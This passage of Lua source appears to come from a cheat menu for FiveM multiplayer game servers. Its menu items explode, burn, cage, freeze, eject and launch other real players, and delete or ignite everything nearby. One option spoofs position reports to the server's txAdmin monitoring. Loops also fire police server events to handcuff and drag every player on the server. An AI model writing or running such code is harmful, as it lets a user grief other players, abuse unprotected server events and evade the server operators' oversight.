                                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, math.random(10,30)*1.0, math.random(-5,5)*1.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                end
                                            end
                                            Citizen.Wait(2000)
                                        end
                                    end)
                                end
                            end},

                            {name = "Zombie Apocalypse", type = "toggle", value = false, onClick = function(state)
                                Menu.ZombieEnabled = state
                                Menu.RegisterFeature("Zombie Mode", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        SetWeatherTypeOvertimePersist("FOGGY", 1.0)
                                        SetArtificialLightsState(true)
                                        while Menu.ZombieEnabled do
                                            local peds = GetGamePool('CPed')
                                            for _, ped in ipairs(peds) do
                                                if not IsPedAPlayer(ped) and DoesEntityExist(ped) then
                                                    SetPedRelationshipGroupHash(ped, GetHashKey("HATES_PLAYER"))
                                                    TaskCombatPed(ped, PlayerPedId(), 0, 16)
                                                    SetPedMoveRateOverride(ped, 2.0)
                                                    SetPedSuffersCriticalHits(ped, false)
                                                end
                                            end
                                            Citizen.Wait(3000)
                                        end
                                        SetArtificialLightsState(false)
                                        ClearWeatherTypePersist()
                                    end)
                                end
                            end},

                            {name = "Drunk Server", type = "action", onClick = function()
                                local peds = GetGamePool('CPed')
                                for _, ped in ipairs(peds) do
                                    if DoesEntityExist(ped) then
                                        SetPedIsDrunk(ped, true)
                                        SetPedMovementClipset(ped, "move_m@drunk@verydrunk", 1.0)
                                        SetPedConfigFlag(ped, 100, true)
                                    end
                                end
                                Menu.Toast("Everyone is drunk!", "yellow")
                            end},

                            {name = "Delete All Vehicles", type = "action", onClick = function()
                                local vehs = GetGamePool('CVehicle')
                                local count = 0
                                for _, veh in ipairs(vehs) do
                                    if DoesEntityExist(veh) and not IsPedInVehicle(PlayerPedId(), veh, false) then
                                        NetworkRequestControlOfEntity(veh)
                                        SetEntityAsMissionEntity(veh, true, true)
                                        DeleteEntity(veh)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast(count .. " vehicles deleted!", "red")
                            end},



                            {name = "Fire Everywhere", type = "toggle", value = false, onClick = function(state)
                                Menu.FireEverywhereEnabled = state
                                Menu.RegisterFeature("Fire Everywhere", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.FireEverywhereEnabled do
                                            local c = GetEntityCoords(PlayerPedId())
                                            for i = 1, 5 do
                                                StartScriptFire(c.x + math.random(-40,40), c.y + math.random(-40,40), c.z, 25, true)
                                            end
                                            Citizen.Wait(1000)
                                        end
                                    end)
                                end
                            end},
                        }
                    },
                    {
                        name = "Target",
                        items = {
                            {isSeparator = true, separatorText = "Nearest Player"},
                            {name = "Cage Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local sourceC = GetEntityCoords(myPed)
                                if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                                    sourceC = GetCamCoord(Menu.FreecamCam)
                                end
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(sourceC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local c = GetEntityCoords(bestPed)
                                    local obj = CreateObject(GetHashKey("prop_gold_cont_01"), c.x, c.y, c.z - 1.0, true, true, false)
                                    FreezeEntityPosition(obj, true)
                                    Menu.Toast("Player caged!", "green")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},
                            {name = "Freeze Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local sourceC = GetEntityCoords(myPed)
                                if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                                    sourceC = GetCamCoord(Menu.FreecamCam)
                                end
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(sourceC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    NetworkRequestControlOfEntity(bestPed)
                                    Citizen.Wait(100)
                                    FreezeEntityPosition(bestPed, true)
                                    Menu.Toast("Player frozen!", "blue")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},
                            {name = "Launch Nearest Up", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local sourceC = GetEntityCoords(myPed)
                                if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                                    sourceC = GetCamCoord(Menu.FreecamCam)
                                end
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(sourceC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    NetworkRequestControlOfEntity(bestPed)
                                    Citizen.Wait(100)
                                    SetEntityVelocity(bestPed, 0.0, 0.0, 100.0)
                                    Menu.Toast("Player launched!", "yellow")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},
                            {name = "Explode Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local sourceC = GetEntityCoords(myPed)
                                if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                                    sourceC = GetCamCoord(Menu.FreecamCam)
                                end
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(sourceC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local c = GetEntityCoords(bestPed)
                                    AddExplosion(c.x, c.y, c.z, 2, 100.0, true, false, 3.0, false)
                                    Menu.Toast("Player exploded!", "red")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},

                            {isSeparator = true, separatorText = "Vehicle Eject"},

                            {name = "Eject Nearest from Vehicle", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local sourceC = GetEntityCoords(myPed)
                                if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                                    sourceC = GetCamCoord(Menu.FreecamCam)
                                end
                                local best, bestPed, bestVeh = 999.0, nil, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed and IsPedInAnyVehicle(tp, false) then
                                        local d = #(sourceC - GetEntityCoords(tp))
                                        if d < best then
                                            best = d
                                            bestPed = tp
                                            bestVeh = GetVehiclePedIsIn(tp, false)
                                        end
                                    end
                                end
                                if bestPed and bestVeh then
                                    Citizen.CreateThread(function()
                                        NetworkRequestControlOfEntity(bestVeh)
                                        NetworkRequestControlOfEntity(bestPed)
                                        Citizen.Wait(100)
                                        SetVehicleDoorsLocked(bestVeh, 1)
                                        SetVehicleEngineOn(bestVeh, false, true, true)
                                        ClearPedTasksImmediately(bestPed)
                                        Citizen.Wait(50)
                                        if IsPedInAnyVehicle(bestPed, false) then
                                            TaskLeaveVehicle(bestPed, bestVeh, 0)
                                        end
                                        Citizen.Wait(200)
                                        if IsPedInAnyVehicle(bestPed, false) then
                                            SetPedIntoVehicle(bestPed, bestVeh, -2)
                                            Citizen.Wait(100)
                                            ClearPedTasksImmediately(bestPed)
                                        end
                                        Citizen.Wait(200)
                                        if IsPedInAnyVehicle(bestPed, false) then
                                            SetVehicleEngineHealth(bestVeh, -1.0)
                                            SetVehicleUndriveable(bestVeh, true)
                                            ClearPedTasksImmediately(bestPed)
                                        end
                                        Menu.Toast("Player ejected!", "green")
                                    end)
                                else
                                    Menu.Toast("No one in vehicle nearby", "red")
                                end
                            end},

                            {name = "Eject ALL from Vehicles", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local count = 0
                                Citizen.CreateThread(function()
                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local tp = GetPlayerPed(pid)
                                        if tp ~= myPed and IsPedInAnyVehicle(tp, false) then
                                            local veh = GetVehiclePedIsIn(tp, false)
                                            NetworkRequestControlOfEntity(veh)
                                            NetworkRequestControlOfEntity(tp)
                                            Citizen.Wait(50)
                                            SetVehicleDoorsLocked(veh, 1)
                                            SetVehicleEngineOn(veh, false, true, true)
                                            ClearPedTasksImmediately(tp)
                                            Citizen.Wait(50)
                                            if IsPedInAnyVehicle(tp, false) then
                                                TaskLeaveVehicle(tp, veh, 0)
                                            end
                                            Citizen.Wait(100)
                                            if IsPedInAnyVehicle(tp, false) then
                                                SetPedIntoVehicle(tp, veh, -2)
                                                ClearPedTasksImmediately(tp)
                                            end
                                            count = count + 1
                                        end
                                    end
                                    Menu.Toast(count .. " players ejected!", "green")
                                end)
                            end},

                            {name = "Eject by ID", type = "action", onClick = function()
                                Menu.OpenInput("Eject", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then Menu.Toast("Invalid ID", "red") return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then Menu.Toast("Player not found", "red") return end
                                    if not IsPedInAnyVehicle(tp, false) then Menu.Toast("Not in vehicle!", "yellow") return end
                                    local veh = GetVehiclePedIsIn(tp, false)
                                    Citizen.CreateThread(function()
                                        NetworkRequestControlOfEntity(veh)
                                        NetworkRequestControlOfEntity(tp)
                                        Citizen.Wait(100)
                                        SetVehicleDoorsLocked(veh, 1)
                                        SetVehicleEngineOn(veh, false, true, true)
                                        ClearPedTasksImmediately(tp)
                                        Citizen.Wait(50)
                                        if IsPedInAnyVehicle(tp, false) then
                                            TaskLeaveVehicle(tp, veh, 0)
                                        end
                                        Citizen.Wait(200)
                                        if IsPedInAnyVehicle(tp, false) then
                                            SetPedIntoVehicle(tp, veh, -2)
                                            Citizen.Wait(100)
                                            ClearPedTasksImmediately(tp)
                                        end
                                        Citizen.Wait(200)
                                        if IsPedInAnyVehicle(tp, false) then
                                            SetVehicleEngineHealth(veh, -1.0)
                                            SetVehicleUndriveable(veh, true)
                                            ClearPedTasksImmediately(tp)
                                        end
                                        Menu.Toast("ID " .. id .. " ejected!", "green")
                                    end)
                                end)
                            end},

                            {name = "Auto-Eject Nearest (Loop)", type = "toggle", value = false, onClick = function(state)
                                Menu.AutoEjectEnabled = state
                                Menu.RegisterFeature("Auto Eject", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AutoEjectEnabled do
                                            local myPed = PlayerPedId()
                                            local myC = GetEntityCoords(myPed)
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local tp = GetPlayerPed(pid)
                                                if tp ~= myPed and IsPedInAnyVehicle(tp, false) then
                                                    local d = #(myC - GetEntityCoords(tp))
                                                    if d < 150.0 then
                                                        local veh = GetVehiclePedIsIn(tp, false)
                                                        NetworkRequestControlOfEntity(veh)
                                                        NetworkRequestControlOfEntity(tp)
                                                        Citizen.Wait(50)
                                                        ClearPedTasksImmediately(tp)
                                                        if IsPedInAnyVehicle(tp, false) then
                                                            TaskLeaveVehicle(tp, veh, 16)
                                                        end
                                                    end
                                                end
                                            end
                                            Citizen.Wait(500)
                                        end
                                    end)
                                end
                            end},

                            {name = "Attach Campfire", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local mdl = GetHashKey("prop_beach_fire")
                                    RequestModel(mdl)
                                    while not HasModelLoaded(mdl) do Citizen.Wait(0) end
                                    local c = GetEntityCoords(bestPed)
                                    local obj = CreateObject(mdl, c.x, c.y, c.z - 1.0, true, true, false)
                                    AttachEntityToEntity(obj, bestPed, 0, 0.0, 0.0, -0.8, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                    Menu.Toast("Fire attached!", "red")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},

                            {name = "Attach Dildo to Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local mdl = GetHashKey("prop_cs_dildo_01")
                                    RequestModel(mdl)
                                    while not HasModelLoaded(mdl) do Citizen.Wait(0) end
                                    local obj = CreateObject(mdl, 0, 0, 0, true, true, false)
                                    local bone = GetPedBoneIndex(bestPed, 31086)
                                    AttachEntityToEntity(obj, bestPed, bone, 0.0, 0.0, 0.2, 90.0, 0.0, 0.0, true, true, false, true, 1, true)
                                    Menu.Toast("Dildo attached to nearest player!", "green")
                                else
                                    Menu.Toast("No players nearby", "red")
                                end
                            end},

                            {isSeparator = true, separatorText = "Extreme Trolling"},



                            {name = "Attach Windmill", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local mdl = GetHashKey("prop_windmill_01")
                                    RequestModel(mdl)
                                    while not HasModelLoaded(mdl) do Citizen.Wait(10) end
                                    local obj = CreateObject(mdl, 0, 0, 0, true, true, false)
                                    AttachEntityToEntity(obj, bestPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                    SetModelAsNoLongerNeeded(mdl)
                                    Menu.Toast("Windmill attached!", "yellow")
                                end
                            end},

                            {name = "Rocket Chair", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    Citizen.CreateThread(function()
                                        local mdl = GetHashKey("prop_off_chair_04")
                                        RequestModel(mdl)
                                        while not HasModelLoaded(mdl) do Citizen.Wait(10) end
                                        local c = GetEntityCoords(bestPed)
                                        local chair = CreateObject(mdl, c.x, c.y, c.z - 0.5, true, true, false)
                                        AttachEntityToEntity(bestPed, chair, 0, 0.0, 0.0, 0.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        Citizen.Wait(500)
                                        SetEntityVelocity(chair, 0.0, 0.0, 200.0)
                                        Citizen.Wait(5000)
                                        DetachEntity(bestPed, true, true)
                                        DeleteEntity(chair)
                                        SetModelAsNoLongerNeeded(mdl)
                                        Menu.Toast("Launched on chair!", "yellow")
                                    end)
                                end
                            end},

                            {name = "Swap Position", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local tc = GetEntityCoords(bestPed)
                                    SetEntityCoordsNoOffset(PlayerPedId(), tc.x, tc.y, tc.z, false, false, false)
                                    SetEntityCoordsNoOffset(bestPed, myC.x, myC.y, myC.z, false, false, false)
                                    Menu.Toast("Positions swapped!", "blue")
                                end
                            end},

                            {name = "Surround With Fire", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local c = GetEntityCoords(bestPed)
                                    for a = 0, 350, 20 do
                                        local rad = math.rad(a)
                                        StartScriptFire(c.x + math.cos(rad) * 4, c.y + math.sin(rad) * 4, c.z, 25, true)
                                    end
                                    Menu.Toast("Fire ring!", "red")
                                end
                            end},

                            {name = "Spin Loop Nearest", type = "toggle", value = false, onClick = function(state)
                                Menu.SpinNearestEnabled = state
                                Menu.RegisterFeature("Spin Nearest", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.SpinNearestEnabled do
                                            local myC = GetEntityCoords(PlayerPedId())
                                            local best, bestPed = 999.0, nil
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local tp = GetPlayerPed(pid)
                                                if tp ~= PlayerPedId() then
                                                    local d = #(myC - GetEntityCoords(tp))
                                                    if d < best then best = d; bestPed = tp end
                                                end
                                            end
                                            if bestPed then
                                                local h = GetEntityHeading(bestPed)
                                                SetEntityHeading(bestPed, h + 30)
                                            end
                                            Citizen.Wait(50)
                                        end
                                    end)
                                end
                            end},

                            {name = "Catapult Nearest", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999.0, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local h = GetEntityHeading(bestPed)
                                    local fv = vector3(-math.sin(math.rad(h)), math.cos(math.rad(h)), 0)
                                    SetEntityVelocity(bestPed, fv.x * 80, fv.y * 80, 60.0)
                                    Menu.Toast("Catapulted!", "yellow")
                                end
                            end},


                        }
                    },
                    {
                        name = "Environment",
                        items = {
                            {isSeparator = true, separatorText = "Weather"},
                            {name = "Force Thunder", type = "action", onClick = function()
                                SetWeatherTypeOvertimePersist("THUNDER", 1.0)
                                Menu.Toast("Thunder weather set!", "yellow")
                            end},
                            {name = "Force Snow", type = "action", onClick = function()
                                SetWeatherTypeOvertimePersist("XMAS", 1.0)
                                Menu.Toast("Snow weather set!", "blue")
                            end},
                            {name = "Force Clear", type = "action", onClick = function()
                                SetWeatherTypeOvertimePersist("CLEAR", 1.0)
                                Menu.Toast("Clear weather set!", "green")
                            end},
                            {isSeparator = true, separatorText = "Time"},
                            {name = "Set Day", type = "action", onClick = function()
                                NetworkOverrideClockTime(12, 0, 0)
                                Menu.Toast("Time: 12:00", "green")
                            end},
                            {name = "Set Night", type = "action", onClick = function()
                                NetworkOverrideClockTime(0, 0, 0)
                                Menu.Toast("Time: 00:00", "purple")
                            end},
                            {isSeparator = true, separatorText = "Chaos"},
                            {name = "Everyone Flee", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                local peds = GetGamePool('CPed')
                                for _, ped in ipairs(peds) do
                                    if not IsPedAPlayer(ped) and DoesEntityExist(ped) then
                                        TaskSmartFleePed(ped, PlayerPedId(), 500.0, -1, false, false)
                                    end
                                end
                                Menu.Toast("Everyone is fleeing!", "yellow")
                            end},
                            {name = "Peds Fight Each Other", type = "action", onClick = function()
                                local peds = GetGamePool('CPed')
                                for _, ped in ipairs(peds) do
                                    if not IsPedAPlayer(ped) and DoesEntityExist(ped) then
                                        SetPedRelationshipGroupHash(ped, GetHashKey("HATES_PLAYER"))
                                        TaskCombatPed(ped, PlayerPedId(), 0, 16)
                                    end
                                end
                                Menu.Toast("Chaos started!", "red")
                            end},
                            {name = "Delete All Peds", type = "action", onClick = function()
                                local peds = GetGamePool('CPed')
                                local count = 0
                                for _, ped in ipairs(peds) do
                                    if not IsPedAPlayer(ped) and DoesEntityExist(ped) then
                                        DeleteEntity(ped)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast("Deleted " .. count .. " peds", "green")
                            end},
                            {name = "Blackout", type = "toggle", value = false, onClick = function(state)
                                SetArtificialLightsState(state)
                                Menu.RegisterFeature("Blackout", state)
                            end},
                        }
                    },
                    {
                        name = "Extra",
                        items = {
                            {isSeparator = true, separatorText = "Freecam & Spawner"},
                            {name = "Freecam", type = "toggle", hasSlider = true, sliderMin = 0.1, sliderMax = 20.0, sliderStep = 0.5, sliderValue = Menu.FreecamSpeed or 1.0, onClick = function(state)
                                Menu.ToggleFreecam(state)
                            end},

                            {name = "Spoofed Freecam (Fake TX Coords)", type = "toggle", onClick = function(state)
                                Menu.SpoofedFreecamEnabled = state
                                if state then
                                    Menu.ToggleFreecam(true)
                                    Menu.SpoofedFreecamThread = Citizen.CreateThread(function()
                                        local ped = PlayerPedId()
                                        local startCoords = GetEntityCoords(ped)
                                        while Menu.SpoofedFreecamEnabled do
                                            local fakeX = startCoords.x + (math.random(-200, 200) / 100.0)
                                            local fakeY = startCoords.y + (math.random(-200, 200) / 100.0)
                                            local fakeZ = startCoords.z + (math.random(-50, 50) / 100.0)
                                            Menu.SafeExec(string.format([[TriggerServerEvent('txsv:req:playerPosition', %f, %f, %f)]], fakeX, fakeY, fakeZ))
                                            Citizen.Wait(500)
                                        end
                                    end)
                                else
                                    Menu.ToggleFreecam(false)
                                    if Menu.SpoofedFreecamThread then
                                        Menu.SpoofedFreecamThread = nil
                                    end
                                end
                            end},


                            {name = "Freeze Spawned Objects", type = "toggle", value = true, onClick = function(state)
                                Menu.FreezeSpawnedObjects = state
                            end},
                            {name = "Auto Map Loader", type = "toggle", value = false, onClick = function(state)
                                Menu.ForceMapLoad = state
                                Menu.RegisterFeature("Auto Map Loader", state)
                            end},
                            {name = "Spawn Object by Name", type = "action", onClick = function()
                                Menu.OpenInput("Spawn Object", "Enter Model Name (e.g. prop_toilet_01):", function(input)
                                    if input and input ~= "" then
                                        Menu.StartCustomLoading(1500, function()
                                            Menu.SpawnObject(input)
                                        end)
                                    end
                                end)
                            end},
                            {name = "Spawn Troll Object", type = "selector", selected = 1, options = {
                                "UFO", "Wind Turbine", "Ferris Wheel", "Cargo Ship", "Cage", "Huge Loop", "Huge Ramp", "Gas Pump", "Meteorite", "Alien Egg"
                            }, onClick = function(sel, val)
                                local m = {
                                    ["UFO"] = "p_spinning_anus_s",
                                    ["Wind Turbine"] = "prop_w_me_wind_01",
                                    ["Ferris Wheel"] = "prop_ld_ferris_wheel",
                                    ["Cargo Ship"] = "prop_cargoship_01",
                                    ["Cage"] = "prop_gold_cont_01",
                                    ["Huge Loop"] = "stunt_loop",
                                    ["Huge Ramp"] = "stunt_ramp_huge",
                                    ["Gas Pump"] = "prop_gas_pump_1d",
                                    ["Meteorite"] = "prop_meteorite",
                                    ["Alien Egg"] = "prop_alien_egg_01",
                                }
                                if val and m[val] then
                                    Menu.StartCustomLoading(1500, function()
                                        Menu.SpawnObject(m[val])
                                    end)
                                end
                            end},
                            {name = "Spawn Ramp / Track", type = "selector", selected = 1, options = {
                                "Large Ramp", "Medium Ramp", "Small Ramp", "Stunt Tube", "Jump Track", "Concrete Wall", "Road Barrier"
                            }, onClick = function(sel, val)
                                local m = {
                                    ["Large Ramp"] = "prop_stunt_ramp_l",
                                    ["Medium Ramp"] = "prop_stunt_ramp_m",
                                    ["Small Ramp"] = "prop_stunt_ramp_s",
                                    ["Stunt Tube"] = "stunt_tube_l",
                                    ["Jump Track"] = "stunt_track_jump",
                                    ["Concrete Wall"] = "prop_barrier_work05",
                                    ["Road Barrier"] = "prop_sec_barrier_ld_02a",
                                }
                                if val and m[val] then
                                    Menu.StartCustomLoading(1500, function()
                                        Menu.SpawnObject(m[val])
                                    end)
                                end
                            end},
                            {name = "Spawn Fun / Prop", type = "selector", selected = 1, options = {
                                "Toilet", "Dumpster", "Sofa", "Phone Box", "Money Bag", "Wheelchair", "Campfire", "Gravestone"
                            }, onClick = function(sel, val)
                                local m = {
                                    ["Toilet"] = "prop_toilet_01",
                                    ["Dumpster"] = "prop_dumpster_01a",
                                    ["Sofa"] = "prop_rub_sofa_01",
                                    ["Phone Box"] = "prop_phonebox_04",
                                    ["Money Bag"] = "prop_money_bag_01",
                                    ["Wheelchair"] = "prop_wheelchair_01",
                                    ["Campfire"] = "prop_beach_fire",
                                    ["Gravestone"] = "prop_gravestone_01a",
                                }
                                if val and m[val] then
                                    Menu.StartCustomLoading(1500, function()
                                        Menu.SpawnObject(m[val])
                                    end)
                                end
                            end},
                            {isSeparator = true, separatorText = "Destruction Actions"},
                            {name = "Explode All", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Citizen.CreateThread(function()
                                        local myPed = PlayerPedId()
                                        local players = GetActivePlayers()
                                        for i = 1, #players do
                                            local targetPed = GetPlayerPed(players[i])
                                            if targetPed ~= myPed and targetPed ~= 0 then
                                                local coords = GetEntityCoords(targetPed)
                                                AddExplosion(coords.x, coords.y, coords.z, 2, 1000.0, true, false, 1.0)
                                                Wait(50)
                                            end
                                        end
                                        print("NULLNEXT! 💣🔥")
                                        Menu.Toast("Exploded all players!", "red")
                                    end)
                                end)
                            end},
                            {name = "Burn All Players", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Citizen.CreateThread(function()
                                        local myPed = PlayerPedId()
                                        for _, p in ipairs(GetActivePlayers()) do
                                            local targetPed = GetPlayerPed(p)
                                            if targetPed ~= myPed and targetPed ~= 0 then
                                                StartEntityFire(targetPed)
                                            end
                                        end
                                        Menu.Toast("Burned all players!", "red")
                                    end)
                                end)
                            end},
                            {name = "Launch All Vehicles", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Citizen.CreateThread(function()
                                        local vehicles = GetGamePool("CVehicle")
                                        local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
                                        for _, veh in ipairs(vehicles) do
                                            if veh ~= myVeh and veh ~= 0 then
                                                NetworkRequestControlOfEntity(veh)
                                                ApplyForceToEntity(veh, 1, 0.0, 0.0, 10000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                            end
                                        end
                                        Menu.Toast("Launched vehicles into the sky!", "red")
                                    end)
                                end)
                            end},
                            {name = "Pop All Tires", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    local vehicles = GetGamePool("CVehicle")
                                    local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    for _, veh in ipairs(vehicles) do
                                        if veh ~= myVeh and veh ~= 0 then
                                            NetworkRequestControlOfEntity(veh)
                                            SetVehicleTyreBurst(veh, 0, true, 1000.0)
                                            SetVehicleTyreBurst(veh, 1, true, 1000.0)
                                            SetVehicleTyreBurst(veh, 2, true, 1000.0)
                                            SetVehicleTyreBurst(veh, 3, true, 1000.0)
                                            SetVehicleTyreBurst(veh, 4, true, 1000.0)
                                            SetVehicleTyreBurst(veh, 5, true, 1000.0)
                                        end
                                    end
                                    Menu.Toast("Popped all tires!", "red")
                                end)
                            end},
                            {name = "Delete All Vehicles", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    local vehicles = GetGamePool("CVehicle")
                                    local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    for _, veh in ipairs(vehicles) do
                                        if veh ~= myVeh and veh ~= 0 then
                                            NetworkRequestControlOfEntity(veh)
                                            SetEntityAsMissionEntity(veh, true, true)
                                            DeleteVehicle(veh)
                                        end
                                    end
                                    Menu.Toast("Deleted all nearby vehicles!", "red")
                                end)
                            end},
                            {name = "Cuff & Vacuum Loop", type = "toggle", value = false, onClick = function(state)
                                Menu.CuffVacuumLoop = state
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.CuffVacuumLoop do
                                            local myId = GetPlayerServerId(PlayerId())
                                            for _, player in ipairs(GetActivePlayers()) do
                                                local targetServerId = GetPlayerServerId(player)
                                                if targetServerId ~= myId then
                                                    Menu.SafeExec(string.format([[
                                                        TriggerServerEvent("m3-core:Server:SetMetaData", 'ishandcuffed', true)
                                                    ]]))
                                                    Citizen.Wait(25)
                                                    Menu.SafeExec(string.format([[
                                                        TriggerServerEvent('police:server:CuffPlayer', "back", %d, 'handcuffs')
                                                        TriggerServerEvent('police:server:CuffPlayer', %d, false)
                                                    ]], targetServerId, targetServerId))
                                                    Citizen.Wait(50)
                                                    Menu.SafeExec(string.format([[
                                                        TriggerServerEvent('fb-police:server:attachPlayer', %d)
                                                    ]], targetServerId))
                                                    Citizen.Wait(400)
                                                    Menu.SafeExec(string.format([[
                                                        TriggerServerEvent('fb-police:server:attachPlayerfalse', %d)
                                                    ]], targetServerId))
                                                    Citizen.Wait(100)
                                                end
                                            end
                                            Citizen.Wait(2000)
                                        end
                                    end)
                                end
                                Menu.Toast("Cuff Loop: " .. (state and "ON" or "OFF"), state and "red" or "blue")
                            end},
                            {name = "Cuff & Vacuum All", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Menu.SafeExec([[
                                        local myId = GetPlayerServerId(PlayerId())
                                        CreateThread(function()
                                            print("^3[ENI] ^7Starting aggressive cuff-and-vacuum...")
                                            for _, player in ipairs(GetActivePlayers()) do
                                                local targetServerId = GetPlayerServerId(player)
                                                if targetServerId ~= myId then
                                                    TriggerServerEvent("m3-core:Server:SetMetaData", 'ishandcuffed', true)
                                                    Wait(25)
                                                    TriggerServerEvent('police:server:CuffPlayer', "back", targetServerId, 'handcuffs')
                                                    Wait(25)
                                                    TriggerServerEvent('police:server:CuffPlayer', targetServerId, false)
                                                    Wait(50)
                                                    TriggerServerEvent('fb-police:server:attachPlayer', targetServerId)
                                                    Wait(400)
                                                    TriggerServerEvent('fb-police:server:attachPlayerfalse', targetServerId)
                                                    Wait(100)
                                                    print("^2[ENI] ^7Cuff+Drop on ID: " .. targetServerId)
                                                end
                                            end
                                            print("^2[ENI] ^7Vacuum complete!")
                                        end)
                                    ]])
                                    Menu.Toast("Cuff & Vacuum started!", "red")
